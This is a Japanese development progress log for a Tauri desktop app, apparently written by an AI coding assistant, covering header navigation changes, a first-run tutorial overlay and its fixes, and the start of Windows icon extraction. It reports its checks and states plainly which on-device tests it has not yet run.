- `.sectionBtn` は背景/枠無しのテキストリンク（`font-size 14px`・`opacity` 濃淡: 非active 0.72 / active 1.0 / disabled 0.4）。`.sections` は診断/設定との間に `border-right: 1px solid var(--border-soft)` の区切り＋余白。

### やらないこと（維持）

新規機能画面（OBS/おすすめ/読み上げ）の実装・実機能を伴う `Screen` 追加（`types.ts` 無変更）／大項目のプルダウン UI（構造の土台のみ）／ネイティブ枠・カスタムタイトルバー・信号機・Windows コントロールの挙動変更／サイドバー・プリセット/ツール管理の導線変更／配色トークンの大規模変更／新ライブラリ・外部リソース追加。

### 変更ファイル（Frontend 3）

- `components/Header.tsx`（ロゴ button 化・SECTIONS 導線・診断/設定 SVG 化・activeNav 型拡張）
- `components/Header.module.css`（`.navBtn` フラット化・`.brand` リセット・`.sections`/`.sectionBtn` 新設）
- `App.tsx`（activeNav 導出に `main` を追加）

### 確認

- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` → 成功（exit 0）
- `git diff --stat` → 上記 3 ファイルのみ（＋ `docs/progress.md`）
- 生の hex/rgba 残置なし（`Header.module.css` を grep 済み・全て `var(--...)`。濃淡は `opacity` プロパティで表現し raw color を持ち込まない）／外部リソース読み込みなし（`img src="/icon.png"` は従来どおり同梱アセット、外部 URL / CDN / フォント無し）
- **セキュリティ確認（docs/security.md 準拠）**: frontend のみ。OS 操作 / ファイル操作 / プロセス操作を追加せず（§2/§4）、アイコンは同梱アセット or インライン SVG のみ（§CSP）、外部通信・telemetry を増やさない（§1）。新規 command / capabilities / ライブラリなし。
- **実機表示（`tauri dev`）は未実施**（ユーザー環境で確認依頼）: 右アイコンが背景無しの白アイコンになり hover/active のエフェクトとうっすら枠が消え以前より大きい／ロゴクリックでメイン画面へ戻れウィンドウドラッグも従来どおり効く／診断・設定の左に右詰めセクション導線が出る（ツール管理のみ有効・他は無効表示）／全画面でヘッダー常時表示・sidebar 有/無ともレイアウト非破綻／ライト・ダーク両テーマで破綻しない。

## 2026-07-12 026 追加 診断/設定画面の「メインに戻る」ボタン削除（導線をヘッダーへ一本化・frontend のみ）

026 でヘッダーにメイン戻り導線（ロゴ＝ホームボタン）を追加したため、診断/設定画面の「メインに戻る」ボタンが重複・不要になり削除。各画面で `onNavigate` はこのボタンでのみ使用していたため、未使用化する prop / import / App.tsx の受け渡しまでクリーン削除。Rust / DB / bindings / `types.ts` 変更なし・新規ライブラリ / 外部リソースなし。

### 変更内容

- `screens/diagnostics/DiagnosticsScreen.tsx`: `layout.actions` 内の「メインに戻る」`Button` を削除（**「再読込」は残置**、`layout.actions` div は維持）。未使用化した `onNavigate` prop（分割代入＋型）と `import type { Screen }` を削除。
- `screens/settings/SettingsScreen.tsx`: 「メインに戻る」`Button` が `layout.actions` の唯一の要素のため **`layout.actions` div ごと削除**（`layout.top` は title のみ）。未使用化した `onNavigate` prop・`import type { Screen }`・`import { Button }`（この画面では他に `Button` プリミティブ未使用）を削除。`preference` / `onChangePreference` は維持。
- `App.tsx`: `<DiagnosticsScreen onNavigate={setScreen} />` / `<SettingsScreen onNavigate={setScreen} … />` から `onNavigate` を除去。`setScreen` は AddTool/AddPreset・`handleNavigate` で継続使用のため残置。

### やらないこと（維持）

AddTool / AddPreset 等その他画面の「戻る」ボタン（対象外）／ヘッダー・その他導線・スタイル・Rust / DB / `types.ts` の変更／新ライブラリ・外部リソース追加。

### 確認

- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0・未使用 prop/import なし）
- `pnpm --filter ./apps/desktop lint` → 成功（exit 0）
- `git diff --name-only` → `App.tsx` / `DiagnosticsScreen.tsx` / `SettingsScreen.tsx`（＋ `docs/progress.md`。Header 系は 026 本体の未コミット差分）
- **セキュリティ確認（docs/security.md 準拠）**: frontend のみ・削除のみ。OS / ファイル / プロセス操作を追加せず（§2/§4）、外部通信・外部リソース・telemetry を増やさない（§1/§CSP）。新規 command / capabilities / ライブラリなし。
- **実機表示（`tauri dev`）は未実施**（ユーザー環境で確認依頼）: 診断画面で「メインに戻る」が消え「再読込」は残る／設定画面で「メインに戻る」が消えタイトルのみのヘッダー行になりレイアウト非破綻／どちらもヘッダーのロゴからメインへ戻れる／ライト・ダーク両テーマで破綻しない。

## 2026-07-12 026 追加 未実装ヘッダーリンクを2本化し「準備中」ダミーページへ遷移（frontend のみ）

ヘッダーの機能大別セクション導線の未実装リンクを「らくらくツール導入」「OBSエフェクト」の2つに整理し、無効表示（クリック不可）をやめて**クリックで「準備中（To be continued）」ダミーページへ遷移**するようにした。実機能はまだ無いが今後追加される旨を遷移先で伝える。frontend のみ・Rust / DB / bindings 変更なし・新規ライブラリ / 外部リソースなし。

### 変更内容

- `types.ts`: `Screen` union に `"rakuraku-tools" | "obs-effects"` を追加（ダミーページ遷移のため。前タスクまでの「Screen を増やさない」方針は本要望で更新）。
- **【新規】`components/headerSections.ts`**: ヘッダー導線の単一ソース `HEADER_SECTIONS`（`{ id, label, screen, implemented, comingSoonDescription? }`）。Header（リンク描画）と App（準備中ページ描画）が同配列を参照し label 重複を回避。ツール管理=implemented / らくらくツール導入・OBSエフェクト=未実装。
- `components/Header.tsx`: ローカル `SECTIONS`（enabled/disabled 判別 union）を撤去し `HEADER_SECTIONS` を使用。セクションは**全項目を均一な navigable リンクとして描画**（`disabled` 分岐撤去。見た目はツール管理と同一）。`activeNav` 型を `main / rakuraku-tools / obs-effects / diagnostics / settings` に拡張。
- `components/Header.module.css`: `.sectionBtn:disabled` を削除、`.sectionBtn:hover:not(:disabled)` を `.sectionBtn:hover` に戻す（無効項目が無くなったため）。生 hex/rgba なし。
- **【新規】`screens/coming-soon/ComingSoonScreen.tsx` + `.module.css`**: 再利用可能な「準備中」ページ。props `{ title, description? }`。`formLayout` の見出し＋中央寄せカードに 🚧・「準備中 / To be continued」・説明・「今後のアップデートで追加予定です。」を表示。トークン（`--surface`/`--line`/`--muted`/`--text-faint` 等）のみ・絵文字のみ・外部リソースなし。
- `App.tsx`: `HEADER_SECTIONS` から `comingSoonSection = HEADER_SECTIONS.find(s => !s.implemented && s.screen === screen)` を導出し、該当時に `<ComingSoonScreen title description />` を描画（新画面は sidebar 無し＝full-width）。`activeNav` 導出を新セクション込みに拡張。

### やらないこと（維持）

らくらくツール導入 / OBSエフェクトの実機能実装（ダミーページのみ）／ヘッダーの見た目・診断/設定・ロゴ導線・その他画面の変更／Rust / DB / capabilities の変更／新ライブラリ・外部リソース追加。

### 確認

- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0・`Screen` 追加を各分岐が網羅・未使用なし）
- `pnpm --filter ./apps/desktop lint` → 成功（exit 0）
- `git diff --name-only` → `types.ts` / `components/headerSections.ts`（新規）/ `components/Header.tsx` / `components/Header.module.css` / `screens/coming-soon/ComingSoonScreen.tsx`（新規）/ `screens/coming-soon/ComingSoonScreen.module.css`（新規）/ `App.tsx`（＋ `docs/progress.md`）
- 生の hex/rgba 残置なし（`ComingSoonScreen.module.css` / `Header.module.css` を grep 済み・全て `var(--...)`）／外部リソース読み込みなし（絵文字のみ・`http`/`url(`/`@import` 無し）
- **セキュリティ確認（docs/security.md 準拠）**: frontend のみ。OS / ファイル / プロセス操作を追加せず（§2/§4）、アイコン/装飾は絵文字のみで外部リソース・外部通信・telemetry を増やさない（§1/§CSP）。新規 command / capabilities / ライブラリなし。
- **実機表示（`tauri dev`）は未実施**（ユーザー環境で確認依頼）: ヘッダーの未実装リンクが「らくらくツール導入」「OBSエフェクト」の2つ（＋ツール管理）になっている／それぞれクリックで「準備中」ダミーページへ遷移し未実装だが今後追加される旨が分かる・該当リンクが active 表示／ロゴ・ツール管理でメインへ戻れる／全画面でヘッダー常時表示・sidebar 有無ともレイアウト非破綻／ライト・ダーク両テーマで破綻しない。

## 2026-07-12 027 First-Run Tutorial (Onboarding)（初回起動ガイドツアー・frontend のみ）

初見ユーザーに「ツール登録 → 配信プリセット作成 → 一括起動」のコア導線を体験で伝えるため、初回起動時のみ薄暗いオーバーレイ＋スポットライトで 16 ステップのガイドツアーを表示。実ツール1件＋実プリセット1件を作らせながら一括起動まで到達させる。frontend のみで完結し、Rust / SQLite / Tauri command / capabilities / CSP・依存は不変。既存挙動は不変で、**唯一の例外＝チュートリアル中のキャンセルボタン無効化のみ**。永続化は `theme.ts` と同方式（localStorage 直接 read/write・例外握りつぶし）。

### 変更内容

**【新規】features/tutorial 構成**
- `features/tutorial/tutorialStorage.ts`: キー `stream-dock.tutorial.completed`。`isTutorialCompleted()` / `markTutorialCompleted()` を try/catch 握りつぶし（`theme.ts` 踏襲）。
- `features/tutorial/tutorialSteps.ts`: 16 ステップ静的定義 `TUTORIAL_STEPS`。各 = `{ id, mode, targetId?, title?, body, advanceOn, lockCancel? }`。`mode` = `dialog` / `spotlight-info`（穴あきで対象を明るく・クリック不可・次へ）/ `spotlight-action`（対象クリック可・ボタン非表示・操作/状態で進む）。`advanceOn` 判別 union = `next` / `target-click{clickId?}` / `screen` / `tools-increased` / `presets-increased`。
- `features/tutorial/useTutorial.ts`: Context 定義＋`useTutorial()` フック。値 `{ active, currentStep, stepIndex, advance, skip, isCancelLockedByTutorial }`。Provider 未設置でも既定値で安全。
- `features/tutorial/TutorialProvider.tsx`: 薄い Provider。props = 監視用 `screen` / `toolsCount` / `presetsCount`。初回判定 = `VITE_SHOW_TUTORIAL==="true"`（env 強制）or `!isTutorialCompleted()`。**開始時に `markTutorialCompleted()`＝中断（閉じる/リロード）も完了扱い**（env 強制時のみフラグを書かず毎回表示）。**状態条件 advance は 1 本の useEffect に集約**し、App から渡る `screen` 一致 / `tools`・`presets` 件数増（ステップ開始時 `baselineRef` 比較）を監視して `advance()`。各画面のハンドラは非改変（非破壊）。

**【新規】オーバーレイ描画（クリック制御方式）**
- `components/tutorial/TutorialOverlay.tsx`: `#root` へ `createPortal`。対象は `querySelector('[data-tutorial-id]')` を `getBoundingClientRect` で計測。**穴あきディム＝上下左右 4 枚パネル方式**（各 `pointer-events:auto` でディム＋外側クリック遮断、穴は空けて対象がネイティブにクリックを受ける＝`spotlight-action`）。**`spotlight-info` は穴に透明ブロッカーを重ねてクリック不可**。`dialog`・対象未検出は全面ディム＋中央カードへフォールバック（「次へ」で進行が止まらない）。再計測は `resize`/`scroll`(capture)＋`ResizeObserver`＋step 変化を **`requestAnimationFrame`** でコアレス（穴がリサイズ・スクロールで対象へ追従）。`target-click` は document capture の click リスナで `closest(clickId)` 一致時 `advance()`（ネイティブ onClick は通常どおり実行＝実操作を兼ねる）。吹き出し（copy＋`next` 時のみ「次へ」）、クリック可ステップに 👆 インジケータ、常時右下に「チュートリアルをスキップ」。
- `components/tutorial/TutorialOverlay.module.css`: ディム・吹き出し・リング・インジケータ・z-index（既存 z-index 規約が無いため新規定義: 9000 系）。**色は全て `var(--tutorial-*)` / 役割トークン経由・生 hex/rgba なし**。

**【新規】env / 型**
- `apps/desktop/.env.local.example`: `VITE_SHOW_TUTORIAL=true`（`.gitignore` の `*.local` で `.env.local` 自体は無視）。
- `vite-env.d.ts`: `interface ImportMetaEnv { readonly VITE_SHOW_TUTORIAL?: string }` を追記。

**【変更】トークン追加（theme.css）**
- `styles/theme.css`: tutorial 専用トークンを `:root` に追加のみ（`--tutorial-dim`＝両テーマ暗いスクリム定数 / `--tutorial-bubble-bg`=`--surface-2` / `--tutorial-bubble-border`=`--elev-border` / `--tutorial-ring` / `--tutorial-ring-soft` / `--tutorial-shadow`）。役割トークン参照は late-bound でテーマ追従。module.css を var 経由に保つための追加。

**【変更】data-tutorial-id の付与（加算的・挙動不変）**
- `components/Header.tsx`: `header-sections`（セクション群 div）/ `header-section-${s.id}`（各セクションボタン＝`header-section-tools` / `-rakuraku` / `-obs`）。
- `components/Sidebar.tsx`: `sidebar-add-tool` / `sidebar-add-preset`。
- `screens/add-tool/AddToolScreen.tsx`: `add-tool-kind-toggle` / `add-tool-panel`。**キャンセル Button に `disabled={isCancelLockedByTutorial()}`**（唯一の挙動変更）。
- `screens/add-preset/AddPresetScreen.tsx`: `add-preset-panel` / `add-preset-next` / `add-preset-launch-list` / `add-preset-submit`。**Step1 キャンセル Button に `disabled={isCancelLockedByTutorial()}`**（唯一の挙動変更）。
- `screens/main/MainScreen.tsx`: `main-launch-all`（右上の一括起動/停止 Button）。

**【変更】App 配線**
- `App.tsx`: ツリーを `TutorialProvider`（props: `screen` / `tools.length` / `presets.length`）でラップし、`Window` と同階層に `TutorialOverlay` を描画。既存 state・ハンドラ・画面 props は不変（Provider ラップに伴う内側 JSX の再インデントのみ）。

### 16 ステップ対応表（# → mode → targetId → advanceOn）

| # | mode | targetId | advanceOn | lockCancel |
|---|---|---|---|---|
| 1 | dialog | — | next | |
| 2 | dialog | — | next | |
| 3 | spotlight-info | header-sections | next | |
| 4 | spotlight-action | header-section-tools | target-click | |
| 5 | spotlight-action | sidebar-add-tool | screen=add-tool | |
| 6 | spotlight-info | add-tool-kind-toggle | next | |
| 7 | spotlight-action | add-tool-panel | tools-increased | ✔ |
| 8 | spotlight-action | sidebar-add-preset | screen=add-preset | |
| 9 | spotlight-info | add-preset-panel | next | |
| 10 | spotlight-action | add-preset-panel | target-click(add-preset-next) | ✔ |
| 11 | spotlight-info | add-preset-launch-list | next | |
| 12 | spotlight-action | add-preset-submit | presets-increased | |
| 13 | dialog | — | next | |
| 14 | spotlight-action | main-launch-all | target-click（実起動を兼ねる） | |
| 15 | dialog | — | next | |
| 16 | dialog | — | next（末尾で完了・非表示） | |

- 仕様の numbered 1〜16 に 1:1 対応。解釈 2 点: item 3（ヘッダー各セクション「順に説明」）はセクション群 1 ステップに集約し copy で 3 セクションを順に説明（診断/設定への任意言及は割愛）。item 8（成功 dialog → プリセット追加 spotlight-action）は全面 dialog だとサイドバーを押せないため成功メッセージを spotlight-action の吹き出しに内包して 1 ステップ化。
- キャンセル無効化は 2 箇所のみ（AddTool キャンセル / AddPreset Step1 キャンセル）。フォーム操作可ステップ（7/10）の穴はフォーム全体を露出するため、穴に入るキャンセルを `disabled` で塞ぐのが目的。AddPreset Step2 は穴を「保存して作成」に絞り 戻る はディムで遮断。

### やらないこと（維持）

Rust / SQLite / Tauri command / capabilities / CSP / 依存の変更。ステップ途中保存・再開ロジック（中断＝完了扱い）。設定画面の「もう一度見る」リセット。キャンセル無効化以外の既存挙動変更・大規模リファクタ。未実装ヘッダーセクション（らくらく/OBS）の実画面実装。新規 npm/crate/plugin・外部リソースの追加。

### 確認

- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` → 成功（exit 0）
- `git diff --name-only` → `App.tsx` / `components/Header.tsx` / `components/Sidebar.tsx` / `screens/add-tool/AddToolScreen.tsx` / `screens/add-preset/AddPresetScreen.tsx` / `screens/main/MainScreen.tsx` / `styles/theme.css` / `vite-env.d.ts`（＋新規 `features/tutorial/` 4 ファイル・`components/tutorial/` 2 ファイル・`.env.local.example`）。**`src-tauri/` に変更なし**。
- `TutorialOverlay.module.css` に生 hex/rgba なし（grep 済み・全て `var(--...)`）／新規ファイルに `http`・`url(`・`@import` の外部参照なし／新規依存（`package.json`/`Cargo.toml`/`pnpm-lock`）なし／capabilities・`tauri.conf.json`(CSP) 不変。
- **セキュリティ確認（docs/security.md 準拠）**: frontend のみ。OS / ファイル / プロセス操作を追加せず（§2/§4）、インジケータは絵文字のみで外部リソース・外部通信・telemetry を増やさない（§1/§CSP）、localStorage はローカルのみ（テーマ設定と同方針）。新規 command / capabilities / ライブラリなし（§10）。Rust / CSP 不変。
- **実機表示（`tauri dev`）は未実施**（ユーザー環境で確認依頼）: `.env.local` に `VITE_SHOW_TUTORIAL=true` を置いて `pnpm --filter ./apps/desktop tauri dev`。16 ステップを踏破でき実ツール1件＋実プリセット1件が作られ一括起動まで到達／スポットライトの穴がリサイズ・スクロールで対象に追従／ステップ 7・10 でキャンセルボタンが無効／右下「チュートリアルをスキップ」で即終了し以降再表示されない／完了フラグ済み（env 強制なし）では何も表示されない／ヘッダー巡回で未実装セクションへ遷移せず補足が出る／ライト・ダーク両テーマで破綻しない。

## 2026-07-12 027 追加 チュートリアルオーバーレイの表示・操作不具合修正（frontend のみ）

初回チュートリアルの実機確認で判明した 2 件を修正。いずれも `components/tutorial/TutorialOverlay.tsx`（＋`.module.css`）に閉じ、16 ステップ定義・advance・data-tutorial-id・キャンセル無効化・Provider・Rust / CSP / 依存は不変。

### 不具合と原因

1. **吹き出し／矢印が画面外にはみ出す**（ステップ7 `add-tool-panel` / 10 `add-preset-panel`）: 穴＝縦長フォームパネルなのに配置が「上/下」2択で、縦の余白不足時に吹き出しを `top: innerH-60`・インジケータを画面外へ置いていた。
2. **スポットライトがヘッダーに被るとヘッダーのリンクが押せてしまう**: `Window.module.css` の `.main { overflow:auto }` で本文が 65px ヘッダー配下へスクロールし、縦長パネルをスクロールすると対象 `rect.top` が負→穴上端が 0 に張り付き、穴（クリック透過領域）がヘッダー帯を覆って上ディムパネルが消え、ヘッダーのリンクがネイティブに押せて別画面へ遷移していた。副次: ヘッダー対象の spotlight-action（ステップ4）が PAD=6 で隣接リンク（間隔4px）に被って押せていた。

### 修正内容（`TutorialOverlay.tsx` / `.module.css`）

- **A（不具合2主対策）**: ヘッダー下端を `document.querySelector("header")` の rect で計測し state 化（既存 `scheduleMeasure` に同梱）。**ヘッダー以外を対象とするステップ**（`targetId` が `"header-"` 始まりでない）では穴上端を `top = max(0, rawTop-pad, headerBottom)` にクランプ。上ディムパネルが常にヘッダーを覆い `pointer-events:auto` で遮断する。クランプ後 `holeW/holeH<=0`（対象が完全にヘッダー裏へ）は中央カードフォールバックへ倒す。
- **B（不具合2副次）**: PAD を対象で出し分け（`pad = isHeaderTarget ? 0 : 6`）。ヘッダー対象（3/4）は穴を対象ぴったりにして隣接リンク漏れを解消（視認性は既存リングのグローで担保）。
- **C（不具合1）**: 配置を空きスペースに応じ **下→上→右→左** で選ぶ `computePlacement()` に置換（縦が入らない縦長パネルは自動で横＝プレビュー列側へ）。インジケータは向きを配置に追従（下👆/上👇/右👈/左👉）、横配置は `.indicatorSide`（横バウンス）。横吹き出しは `.bubbleSide`（`max-width:300px`）で幅を抑え対象に被りにくく。吹き出し・インジケータは常に viewport 内へ clamp。

### 確認

- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` → 成功（exit 0）
- 変更は `components/tutorial/TutorialOverlay.tsx` / `TutorialOverlay.module.css`（＋本 `docs/progress.md`）のみ。**`src-tauri/` 変更なし**。`.module.css` に生 hex/rgba なし（`var(--...)` のみ）・外部参照なし・新規依存なし。
- **セキュリティ確認（docs/security.md 準拠）**: frontend のみ。OS / ファイル / プロセス操作を追加せず（§2/§4）、インジケータは絵文字のみで外部リソース・外部通信・telemetry を増やさない（§1/§CSP）。新規 command / capabilities / ライブラリなし（§10）。Rust / CSP 不変。
- **実機表示（`tauri dev`）は未実施**（ユーザー環境で確認依頼）: `.env.local` に `VITE_SHOW_TUTORIAL=true` を置いて起動。ステップ7/10 で吹き出し・矢印が穴の横に出て画面外へはみ出さない（縦に狭めても横へ回り込む）／どのステップでも（縦長パネルをスクロールしても）ヘッダーが常に暗転しリンクを押せず誤遷移しない／ステップ4でハイライトが「ツール管理」に密着し隣の「らくらくツール導入」を押せずクリックで正常に次へ進む／既存挙動（16ステップ踏破・キャンセル無効・スキップ・穴の追従・ライト/ダーク）に回帰なし。

## 2026-07-12 027 追加 チュートリアル横配置時の指インジケータ被り修正（frontend のみ）

横配置（右/左）の吹き出しで指インジケータ（👈/👉）が吹き出しに重なり文字が読みにくかった。原因は `TutorialOverlay.tsx` の `computePlacement()` 横配置分岐で、穴〜吹き出しの間隔 `GAP=16` がインジケータの見た目幅（絵文字 `font-size:30px` ≒30px）より狭く、`right+2`/`left-32` 起点の指が吹き出し端へ食い込んでいた。

### 修正内容（`components/tutorial/TutorialOverlay.tsx` の `computePlacement()` のみ）

- 定数追加: `SIDE_GAP=46`（横配置の穴〜吹き出し間隔＝指が収まる幅）・`IND=30`（指の見た目幅）。
- 横配置を選ぶ閾値を `BW_SIDE + SIDE_GAP`（=346）に変更（ツール/プリセット画面の右空き ≒400px で満たす）。
- 右/左とも吹き出しを `SIDE_GAP` 分離し、インジケータを**穴と吹き出しの隙間の中央**へ配置（`right + (gapW-IND)/2` 等）→ 吹き出しへ被らない。
- 隙間がインジケータに満たない場合（狭い側へのフォールバック等）は戻り値 `showIndicator=false` として**指を描画しない**（可読性優先）。JSX を `{isAction && showIndicator && ...}` に変更。上下配置は常に表示。併せて上下配置のインジケータと吹き出しの間隔も軽微に拡大。

### 確認

- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0）／`lint` → 成功（exit 0）
- 変更は `components/tutorial/TutorialOverlay.tsx`（＋本 `docs/progress.md`）のみ。`.module.css` 変更なし・`src-tauri/` 変更なし・新規依存/外部リソースなし・Rust / CSP 不変（§1/§2/§4/§CSP/§10）。
- **実機表示（`tauri dev`）は未実施**（ユーザー環境で確認依頼）: ステップ7/10 で吹き出しが穴の横に出て指が吹き出しに被らず文字が読める／横に狭めても画面内に収まり上下配置（他ステップ）に回帰なし。

## 2026-07-12 027 追加 プリセットStep1「次へ」のバリデーション失敗時にチュートリアルだけ進む問題の修正（frontend のみ）

チュートリアルのステップ10（プリセット Step1）が `advanceOn: target-click(add-preset-next)` で「次へ」クリック自体で進んでいたため、名前未入力・ツール未選択でも `AddPresetScreen.goNext()` がエラー表示で Step1 に留まる一方、チュートリアルだけ Step2 の説明（ステップ11）へ進み、画面と説明が食い違っていた（実装当初の既知の弱点）。

### 修正内容（`tutorialSteps.ts` ＋ `TutorialOverlay.tsx` のみ・非破壊）

- `AdvanceOn` に汎用プリミティブ `{ kind: "target-appears"; appearId }`（指定 data-tutorial-id 要素が DOM に現れたら進む）を追加。
- ステップ10 `preset-step1` の `advanceOn` を `target-appears("add-preset-launch-list")` に変更。`add-preset-launch-list`（起動リスト）は `AddPresetScreen` の内部 Step2 でのみレンダーされるため、**バリデーション通過して Step2 に入った時だけ**進む。`mode: spotlight-action` / `targetId: add-preset-panel` / `lockCancel` は維持し、native の「次へ」クリックは従来どおり `goNext()` を実行。
- `TutorialOverlay.tsx` に `target-appears` 用 useEffect を追加（要素の初回チェック＋`MutationObserver(document.body, childList/subtree)` で出現監視 → `advance()`、cleanup で disconnect）。既存の target-click 監視（ステップ4/14）は不変。`AddPresetScreen` のハンドラ・バリデーション・data 属性は非改変。

### 確認

- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0）／`lint` → 成功（exit 0）
- 変更は `features/tutorial/tutorialSteps.ts` / `components/tutorial/TutorialOverlay.tsx`（＋本 `docs/progress.md`）のみ。`src-tauri/` 変更なし・新規依存/外部リソースなし・Rust / CSP 不変（§1/§2/§4/§CSP/§10）。
- **実機表示（`tauri dev`）は未実施**（ユーザー環境で確認依頼）: プリセット Step1 で名前/ツール未設定のまま「次へ」→ エラーが出て Step1 に留まり、チュートリアルも Step1 の説明のまま進まない／入力・選択して「次へ」→ Step2 に入りチュートリアルが「起動設定」へ進む／部分入力でも Step2 到達まで進まない／以降（保存して作成→一括起動→完了）まで通し他ステップに回帰なし。

## 2026-07-12 027 レビュー対応 advance 多重呼び出しによるステップ飛ばしの冪等化（frontend のみ）

027 の差分全体（本実装＋4修正）にセキュリティ／品質レビューを実施。セキュリティは問題なし（`src-tauri/`・capabilities・CSP・依存すべて不変、外部通信/リソースなし、危険 DOM API なし、localStorage はテーマ同方針、セレクタは静的定数のみ）。品質は「中1・低2」を検出し、中1 のみ修正。

### 今回完了したこと

- **中の修正**: `advance()` がステップ遷移コミット前に複数回呼ばれるとステップを飛ばし得る問題（target-click のダブルクリック＝ステップ14 で「一括起動できました」を飛ばす／target-appears の MutationObserver 多重発火／screen 条件 effect 再発火）を冪等化。`TutorialProvider` に `stepIndexRef`（コミット済み index ミラー）＋`advancedFromRef`（直近 advance 済み index）を追加し、`advance()` は `advancedFromRef.current === from` なら no-op。判定・更新は `setStepIndex` の **updater 外**で行い StrictMode の updater 二重実行を回避。state 条件は既存 `baselineRef` に加え本ガードで一律冪等化。
- **低1（未修正・意図をコメント化）**: `add-preset-next` の `data-tutorial-id` はバグD修正で target-appears へ切替後どのステップも参照しないが、害のない安定目印として残置する旨を `AddPresetScreen.tsx` にコメント記載。
- **低2（対応不要）**: 対象未検出時の中央カード縮退は既存コメント（`TutorialOverlay.tsx` の「進行が止まらないよう」）で意図が既述のため追加なし。

### 変更した主要ファイル

- `apps/desktop/src/features/tutorial/TutorialProvider.tsx`（冪等ガード追加。挙動は正常時不変・安全側の防御のみ）
- `apps/desktop/src/screens/add-preset/AddPresetScreen.tsx`（`add-preset-next` 残置理由コメントのみ・挙動不変）

### まだ未完了のこと / 次にやるべきタスク

- **実機表示（`tauri dev`）が 027 全体で未実施**。`.env.local` に `VITE_SHOW_TUTORIAL=true` を置いて 16 ステップ通し確認が最優先。特に本回の冪等化: **ステップ14「一括起動」を素早く2回押しても「一括起動できました」（ステップ15）を飛ばさない**こと、および全ステップで飛ばし・回帰がないこと。
- ライト／ダーク両テーマの視認性確認（レビュー指摘の軽微メモ: ライト時のグロー `--tutorial-ring-soft`＝secondary 28% が淡い。主線リング 72% が輪郭を担保するため実害は小だが、実機で縁が弱ければ 38–40% へ調整余地）。
- 実機 OK 後、027 差分（新規 `features/tutorial/`・`components/tutorial/`＋既存への加算的変更）をコミット。

### 既知のエラー

- なし（typecheck / lint ともクリーン、コンパイルエラー・ランタイム既知不具合なし）。未実施なのは実機目視確認のみ。

### 実行した確認コマンド

- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` → 成功（exit 0）
- `git status --porcelain` ／ `git diff --name-only` ／ `src-tauri`・`Cargo`・`tauri.conf`・`capabilities`・`package.json`・`pnpm-lock` の変更なしを grep 確認（すべて空＝不変）
- `grep` で tutorial 配下に `http`/`url(`/`@import`/`fetch`/`WebSocket`・`innerHTML`/`dangerouslySetInnerHTML`/`eval`・`.module.css` の生 hex/rgba がないことを確認（いずれもなし）

### 次回セッションで最初に読むべきファイル

- 本 `docs/progress.md` 末尾の 027 各節（本実装＋4修正＋本レビュー対応）
- `docs/tasks/027-first-run-tutorial.md`（仕様・完了条件・セキュリティ制約）
- `apps/desktop/src/features/tutorial/TutorialProvider.tsx`（冪等ガードの実装）
- `apps/desktop/src/components/tutorial/TutorialOverlay.tsx`（幾何・target-click/target-appears の advance 経路）
- `apps/desktop/src/features/tutorial/tutorialSteps.ts`（16 ステップ定義・advanceOn union）

## 2026-07-12 028 Windows App Icon Auto-Extraction（Windows(.exe) 実アイコン抽出の本実装・Rust のみ）

### 完了したこと（本タスクの完了条件＝macOS 上で達成）

- 018 で `Ok(None)` スタブだった **Windows(.exe) の実アイコン抽出**を本実装した。ユーザーがピッカーで選んだ
  `.exe` のシェル表示アイコンを取得し、018 と同じ出力仕様（`data:` 無し base64 PNG・≤128px・失敗は `Ok(None)`）で返す。
  frontend / DB スキーマ / `extract_app_icon` の I/F・出力仕様は **018 のまま流用（変更なし）**。実質は Rust の
  Windows 抽出ロジック追加 + Cargo.toml の依存再配置/feature 追加のみ。
- ⚠️ **Windows コードは未検証のまま main に入る**（下記「未検証範囲」）。実コンパイル・実機 E2E は 098 が初。

### (1) Cargo.toml（依存再配置と feature 追加・docs/security.md §10）

- `image`（`default-features=false, features=["png"]`）と `base64` を `[target.'cfg(target_os = "macos")'.dependencies]`
  から **共通 `[dependencies]` へ移動**。理由: 共有化した `encode_png_base64`（icon.rs 直下・macOS/Windows で
  コンパイル）が両クレートを参照するため。機能スペックは維持・**新規クレート追加ではない**（ターゲット再配置）。
  `plist` / `icns` / `objc2-*` は macOS 限定のまま据え置き。
- `[target.'cfg(windows)'.dependencies] windows`（0.58）に feature を4つ追加（理由コメントを Cargo.toml に明記）:
  - `Win32_UI_Shell`（`SHCreateItemFromParsingName` / `IShellItemImageFactory` / `SHGetFileInfoW`）
  - `Win32_Graphics_Gdi`（`GetObjectW` / `GetDIBits` / `HBITMAP` / `BITMAP` / `DeleteObject` / DC 系 / `GetIconInfo`）
  - `Win32_System_Com`（`CoInitializeEx` / `CoUninitialize`）
  - `Win32_Storage_FileSystem`（`SHGetFileInfoW` の第2引数 `FILE_FLAGS_AND_ATTRIBUTES` 由来。**task doc の当初
    一覧には無かったが、windows 0.58 実ソースの `#[cfg(all(Win32_Storage_FileSystem, Win32_UI_WindowsAndMessaging))]`
    gate 上フォールバック採用に必須**と机上確認できたため追加。ユーザー承認済み）。
- `Cargo.lock` は**変更なし**（feature 選択は Cargo.toml に記録され、解決済みクレートの版・依存グラフは不変。
  image/base64 のターゲット間移動も同一クレート・同一版のため lock に差分は出ない）。

### (2) icon.rs 共通化リファクタ（macOS 挙動不変）

- `MAX_ICON_PX` と `encode_png_base64(DynamicImage) -> Option<String>` を `mod macos` 内から **`icon.rs` 直下へ
  引き上げ**、`#[cfg(any(target_os = "macos", windows))]` で gate（Linux では未使用のため dead_code 警告回避）。
  `use base64::Engine;` は当該 fn 内へ移動。macOS 側は呼び出しを `super::encode_png_base64(...)` に変更しただけで
  **ロジック・出力は完全不変**。
- `extract_app_icon` の分岐を3分割: `#[cfg(target_os="macos")]`→`macos::extract` /
  `#[cfg(windows)]`→`windows::extract` / `#[cfg(all(not(macos),not(windows)))]`→`Ok(None)`（Linux 従来どおり）。
- `validate_icon_path` は変更なし（`.app` 例外は `cfg!(target_os="macos")` gate 済み。Windows では `.exe` 通過・
  ディレクトリ/`.lnk`/`.bat` 拒否）。

### (3) 新設 `#[cfg(windows)] mod windows`（抽出設計・リソース解放）

